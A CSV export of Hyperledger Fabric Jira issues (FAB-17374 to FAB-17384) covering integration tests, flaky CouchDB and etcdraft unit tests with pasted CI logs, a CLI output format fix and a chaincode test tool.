Add a chaincode-as-server integration test in fabric,FAB-17374,43952,,Task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,muralisr,sykesm,sykesm,11/Jan/20 1:01 AM,09/Jul/20 12:19 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"I was recently bumping dependencies and noticed that fabric was not puling a version of fabric-chaincode-go that includes the chaincode as server feature. That implies we are missing tests.

[~muralisrini] - My understanding was that you would be adding a test between Beta and GA. When do you think you'll be able to do that?",,denyeart,muralisr,sykesm,,,,,,,,,,,,,,,,,,,FABCG-11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-13582,,,No,,Unset,No,,,"1|i00n2e:8zfzzu",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,muralisr,sykesm,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Jan/20 2:22 AM;denyeart;[~muralisr] What wasn't said in the Description, is that we believe the fabric-chaincode-go changes that were done for ""chaincode as a server"" stories broke even normal chaincode scenarios, so integration tests should expose this...;;;","11/Jan/20 2:32 AM;muralisr;[~sykesm] will work on the integ. tests this weekend.

 

[~denyeart]  _we believe the fabric-chaincode-go changes that were done for ""chaincode as a server"" stories broke even normal chaincode scenarios_  – I wasn't aware of this. Can you provide pointers ?;;;","11/Jan/20 2:42 AM;sykesm;Just have to bump the fabric-chaincode-go dependency in fabric and run integration tests.;;;","11/Jan/20 4:09 AM;sykesm;Looks like this commit introduced the issue: https://github.com/hyperledger/fabric-chaincode-go/commit/b09ce66a53021cebbc944074ab0d95b0120c645a;;;","11/Jan/20 4:56 AM;muralisr;Ok I bumped into that as I was working on the integration test   (was thinking there  something else was found.);;;","11/Jan/20 5:19 AM;muralisr;Ignore the previous comment pl...just got the full context from [https://github.com/hyperledger/fabric-chaincode-go/pull/18]. Will fix it in the next few days ... and integ test it locally in fabric.;;;","12/Jan/20 9:07 AM;muralisr;Fix TLS correctly on fabric-chaincode-go in FABCG-11. Will verify fabric integration tests locally.

Will complete the integration test once this is merged upstream.;;;","13/Jan/20 1:40 AM;muralisr;pushed [https://github.com/hyperledger/fabric-chaincode-go/pull/19] . This was tested locally by running `make integration-test`

 
{code:java}
• [SLOW TEST:81.448 seconds]
 DiscoveryService discovers network configuration, endorsers, and peer membership 
 ...
...
 SUCCESS! 1m21.531214892s PASS
 [1578783345] New World Order Suite - 4/4 specs •••• SUCCESS! 2m40.557027703s PASS
 [1578783345] Pluggable endorsement and validation EndToEnd Suite - 1/1 specs • SUCCESS! 21.470295313s PASS
 [1578783345] EndToEnd Idemix Suite - 1/1 specs • SUCCESS! 28.960250485s PASS
 [1578783345] Ledger Suite - 10/10 specs •••••••••• SUCCESS! 4m48.541440262s PASS
Ginkgo ran 13 suites in 47m16.198436425s
 Test Suite Passed
 
{code}
 

 

Working on fabric integration test for chaincode-as-server (need the above PR to get in first).;;;","26/Jan/20 8:13 AM;muralisr;[https://github.com/hyperledger/fabric/pull/552];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent failure in TestDBRequestTimeout during PR verification,FAB-17375,43955,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,,sykesm,sykesm,11/Jan/20 1:12 AM,25/Mar/20 6:03 AM,28/Oct/23 3:09 AM,25/Mar/20 6:03 AM,v2.0.0,,,,,,,,,v2.1.0,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"Test failure in unit tests during PR verification.

{code}
2020-01-10 15:39:30.981 UTC [couchdb] handleRequest -> DEBU 621 Error handling CouchDB request. Error:not_found,  Status Code:404,  Reason:Database does not exist.
--- FAIL: TestDBRequestTimeout (0.48s)
    couchdb_test.go:620: 
        	Error Trace:	couchdb_test.go:620
        	Error:      	An error is expected but got nil.
        	Test:       	TestDBRequestTimeout
        	Messages:   	Error should have been thown while trying to create a couchdb instance with a connection timeout
{code}

Logs:
https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=5101&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=2080

Build:
https://github.com/hyperledger/fabric/pull/485/checks?check_run_id=383569855",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017kb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Mar/20 5:35 AM;sykesm;https://github.com/hyperledger/fabric/pull/885;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT test failure in consensus/etcdraft: Chain 3-node Raft cluster when reconfiguring raft cluster reconfiguration [It] removes leader from replica set,FAB-17376,43956,,Bug,To Do,FAB,Fabric,software,denyeart,,,High,,guoger,sykesm,sykesm,11/Jan/20 2:33 AM,21/Apr/20 3:41 AM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=5115&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=4106

{code}
• Failure [10.115 seconds]
Chain
/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78
  3-node Raft cluster
  /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453
    when reconfiguring raft cluster
    /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603
      reconfiguration
      /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712
        adding node to the cluster [It]
        /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1927

        Timed out after 10.000s.
        Expected
            <int>: 1
        to equal
            <int>: 2

        /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1940
------------------------------
{code}",,caod,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Mar/20 11:45 PM;caod;03-16-20.txt;https://jira.hyperledger.org/secure/attachment/18172/03-16-20.txt","28/Feb/20 4:59 AM;sykesm;etcdraft.txt;https://jira.hyperledger.org/secure/attachment/18146/etcdraft.txt","12/Mar/20 12:35 AM;wenjian;etcdraft_chain_test.log;https://jira.hyperledger.org/secure/attachment/18166/etcdraft_chain_test.log","19/Mar/20 5:52 AM;tsharris;raft03182020.log;https://jira.hyperledger.org/secure/attachment/18176/raft03182020.log","21/Apr/20 3:41 AM;tsharris;raft_04202020.log;https://jira.hyperledger.org/secure/attachment/18224/raft_04202020.log",,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017kj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jan/20 2:07 AM;sykesm;Similar failure (https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=5387&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d&l=3174):

{code}
2020-01-15T17:03:04.4367031Z ------------------------------
2020-01-15T17:03:04.4367291Z â€¢ Failure [10.165 seconds]
2020-01-15T17:03:04.4367350Z Chain
2020-01-15T17:03:04.4367665Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78
2020-01-15T17:03:04.4367924Z   3-node Raft cluster
2020-01-15T17:03:04.4368249Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453
2020-01-15T17:03:04.4368317Z     when reconfiguring raft cluster
2020-01-15T17:03:04.4368640Z     /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603
2020-01-15T17:03:04.4368697Z       reconfiguration
2020-01-15T17:03:04.4369019Z       /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712
2020-01-15T17:03:04.4369458Z         rotates leader certificate and triggers leadership transfer [It]
2020-01-15T17:03:04.4369788Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1753
2020-01-15T17:03:04.4369840Z 
2020-01-15T17:03:04.4370112Z         Timed out after 10.000s.
2020-01-15T17:03:04.4370163Z         Expected
2020-01-15T17:03:04.4370206Z             <int>: 1
2020-01-15T17:03:04.4370260Z         to equal
2020-01-15T17:03:04.4370499Z             <int>: 2
2020-01-15T17:03:04.4370534Z 
2020-01-15T17:03:04.4370586Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1790
2020-01-15T17:03:04.4370855Z ------------------------------
{code};;;","28/Feb/20 4:54 AM;sykesm;Similar issue in the same suite: https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8744&view=logs&j=0a97ca82-e6d7-53d3-520d-b1d88f915027&t=02e77de7-5c5f-5e0e-2a53-20d32fa2f823&l=7577;;;","03/Mar/20 5:17 AM;wenjian;Hit similar issue in https://github.com/hyperledger/fabric/pull/778/checks?check_run_id=480513242. 

2020-03-02T19:54:45.3912233Z [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78[0m
2020-03-02T19:54:45.3912738Z   3-node Raft cluster
2020-03-02T19:54:45.3913309Z   [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453[0m
2020-03-02T19:54:45.3913700Z     when reconfiguring raft cluster
2020-03-02T19:54:45.3914300Z     [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603[0m
2020-03-02T19:54:45.3914675Z       reconfiguration
2020-03-02T19:54:45.3915274Z       [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712[0m
2020-03-02T19:54:45.3915952Z         [91m[1mstop leader and continue reconfiguration failing over to new leader [It][0m
2020-03-02T19:54:45.3917350Z         [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2017[0m
2020-03-02T19:54:45.3917681Z 
2020-03-02T19:54:45.3918353Z         [91mTimed out after 10.000s.
2020-03-02T19:54:45.3918569Z         Expected
2020-03-02T19:54:45.3918773Z             <int>: 0
2020-03-02T19:54:45.3918962Z         to equal
2020-03-02T19:54:45.3919303Z             <int>: 1[0m
2020-03-02T19:54:45.3919453Z 
2020-03-02T19:54:45.3919895Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2051;;;","11/Mar/20 4:49 AM;sykesm;And another one: https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9637&view=logs&jobId=a11cdf60-0d11-5130-c801-1b4953009464&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d

{code}
2020-03-10T19:39:21.8886989Z [1mSTEP[0m: Submitting first tx to cut the block
2020-03-10T19:39:21.8887454Z [1mSTEP[0m: sending config transaction
2020-03-10T19:39:21.8887637Z 
2020-03-10T19:39:21.8887975Z [90m------------------------------[0m
2020-03-10T19:39:21.8888387Z [91m[1mâ€¢ Failure [10.113 seconds][0m
2020-03-10T19:39:21.8888604Z Chain
2020-03-10T19:39:21.8889138Z [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78[0m
2020-03-10T19:39:21.8889627Z   3-node Raft cluster
2020-03-10T19:39:21.8890221Z   [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453[0m
2020-03-10T19:39:21.8890714Z     when reconfiguring raft cluster
2020-03-10T19:39:21.8891327Z     [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603[0m
2020-03-10T19:39:21.8891706Z       reconfiguration
2020-03-10T19:39:21.8892290Z       [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712[0m
2020-03-10T19:39:21.8893179Z         [91m[1mstop leader and continue reconfiguration failing over to new leader [It][0m
2020-03-10T19:39:21.8893900Z         [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2017[0m
2020-03-10T19:39:21.8894214Z 
2020-03-10T19:39:21.8894549Z         [91mTimed out after 10.000s.
2020-03-10T19:39:21.8894781Z         Expected
2020-03-10T19:39:21.8894968Z             <int>: 0
2020-03-10T19:39:21.8895153Z         to equal
2020-03-10T19:39:21.8895507Z             <int>: 1[0m
2020-03-10T19:39:21.8895668Z 
2020-03-10T19:39:21.8895983Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2051
2020-03-10T19:39:21.8896536Z [90m------------------------------[0m
2020-03-10T19:39:21.8897248Z {""level"":""debug"",""msg"":""No snapshot found at /tmp/raft-test-392332648/node-1-240961447/snapshot"",""channel"":""multi-node-channel"",""node"":1}
2020-03-10T19:39:21.8898213Z {""level"":""info"",""msg"":""No WAL data found, creating new WAL at path '/tmp/raft-test-392332648/node-1-240961447/wal'"",""channel"":""multi-node-channel"",""node"":1}
{code};;;","12/Mar/20 12:32 AM;wenjian;Similar failure:
2020-03-11T15:00:44.8407196Z [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78[0m
2020-03-11T15:00:44.8407733Z   3-node Raft cluster
2020-03-11T15:00:44.8408337Z   [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453[0m
2020-03-11T15:00:44.8408767Z     when reconfiguring raft cluster
2020-03-11T15:00:44.8409404Z     [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603[0m
2020-03-11T15:00:44.8409806Z       reconfiguration
2020-03-11T15:00:44.8410419Z       [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712[0m
2020-03-11T15:00:44.8411247Z         [91m[1mensures that despite leader failure cluster continue to process configuration to remove the leader [It][0m
2020-03-11T15:00:44.8412069Z         [90m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2189[0m
2020-03-11T15:00:44.8412417Z 
2020-03-11T15:00:44.8412773Z         [91mTimed out after 10.000s.
2020-03-11T15:00:44.8413122Z         Expected
2020-03-11T15:00:44.8413336Z             <int>: 20
2020-03-11T15:00:44.8413532Z         to equal
2020-03-11T15:00:44.8413882Z             <int>: 19[0m
2020-03-11T15:00:44.8414036Z 
2020-03-11T15:00:44.8414367Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2221;;;","12/Mar/20 12:32 AM;wenjian;https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9702&view=logs&j=a11cdf60-0d11-5130-c801-1b4953009464;;;","16/Mar/20 11:46 PM;caod;Hit again: [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9939&view=logs&jobId=a11cdf60-0d11-5130-c801-1b4953009464&j=a11cdf60-0d11-5130-c801-1b4953009464&t=849b73ad-cbaa-5065-7214-c0ac3d42920d] (see attached);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update protos to reflect latest changes,FAB-17377,43957,43831,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,13/Jan/20 8:55 PM,01/Feb/20 5:15 AM,28/Oct/23 3:09 AM,01/Feb/20 5:15 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,Update according to discussion in FAB-17308 ,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017kr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Jan/20 10:47 PM;yacovm;https://github.com/hyperledger/fabric-protos/pull/23;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add samplejava to systemtest etcdraft network and move sbe from kafka to etcdraft network,FAB-17378,43959,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,bharadwajambati1,bharadwajambati1,14/Jan/20 2:50 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,26/Feb/20 1:33 PM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,azp-migrate,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,FAB-17178,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17216,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfp:m",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix print format for querycommitted,FAB-17379,43961,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,14/Jan/20 4:26 AM,16/Jan/20 7:36 AM,28/Oct/23 3:09 AM,16/Jan/20 7:36 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,,,,,,"When running *peer lifecycle chaincode querycommitted* command with only a channel name (specified), the command displays multiple chaincode definitions without line breaks as follows.
{code}
$ peer lifecycle chaincode querycommitted --channelID mychannel
Committed chaincode definitions on channel 'mychannel':
Name: fabcar, Version: 1, Sequence: 1, Endorsement Plugin: escc, Validation Plugin: vsccName: fabcar2, Version: 1, Sequence: 1, Endorsement Plugin: escc, Validation Plugin: vscc
{code}
To improve readability, the print format should add line breaks.",,tatsu-sato,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017lf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jan/20 6:13 AM;wlahti;[https://github.com/hyperledger/fabric/pull/497];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add defaults to collection config maxPeerCount and requiredPeerCount properties,FAB-17380,43962,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,caod,caod,caod,14/Jan/20 4:32 AM,14/Jan/20 5:36 AM,28/Oct/23 3:09 AM,14/Jan/20 5:36 AM,v2.0.0,,,,,,,,,,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"As part of FAB-17303, we're deciding on adding defaults for the `maxPeerCount` and `requiredPeerCount` values for implicit collections if not specified. Specifically `maxPeerCount: 1` and `requiredPeerCount: 0`. This issue tracks the other side for explicit collection definition configs.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb0zy",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jan/20 5:36 AM;caod;After some discussion we've decided to leave the existing defaults of 0 and 0 when not specified.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update policy concept for test network,FAB-17381,43963,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,14/Jan/20 6:37 AM,01/Feb/20 6:43 AM,28/Oct/23 3:09 AM,30/Jan/20 5:20 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,Concept topic refers to BYFN policy setup,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i017ln:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Common testing of chaincode language implementations using cucumber,FAB-17382,43971,,Epic,In Progress,FAB,Fabric,software,denyeart,,,High,,awjh-ibm,awjh-ibm,awjh-ibm,14/Jan/20 11:49 PM,29/Jan/20 7:38 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"Currently each language implementation is required to write its own integration tests to ensure it works.

This leaves the risk of gaps between implementations in support of basic features and also duplicates workload.

This epic is for the creating of new tool in fabric-test which will be released as an npm package which can then be run as part of the build pipelines for existing and future chaincode languages. This tool will provide a set of feature files dictating tests to run. The tool will run as a CLI against a given set of chaincode written in a given chaincode language.",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,ghx-label-11,,Common testing of chaincode language implementations using cucumber,To Do,No,,Unset,No,,,"1|i017mr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should run tests against multiple network setups,FAB-17383,43972,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,14/Jan/20 11:58 PM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should be able to run multiple network setups. This implementation for this should be easily expandable for contributors to the tool.

Orginally there should be a single and multi-org (three) setup. The tool should only run specific features (tagged) for a network.

Adding a new network should be documented for contributors and require minimal file additions (docker and crypto definitions)",,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17382,,,No,,Unset,No,,,"1|i017mz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The chaincode test tool should allow a user to set a logging level,FAB-17384,43973,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,awjh-ibm,awjh-ibm,awjh-ibm,15/Jan/20 12:05 AM,21/Jan/20 1:14 AM,28/Oct/23 3:09 AM,21/Jan/20 1:14 AM,,,,,,,,,,,,,,fabric-test,,,,,,,,,0,cc-codeowners,cc-triaged,,,,"The chaincode test tool should take an optional argument defining the detail of logging to be provided. The default for this should be ""info"" with an option of ""debug"" provided also.

Debug should provide more in depth detail about the processes running and info should give a top level view to keep the user posted of where the tool is.

Error output should always be shown no matter the log level.

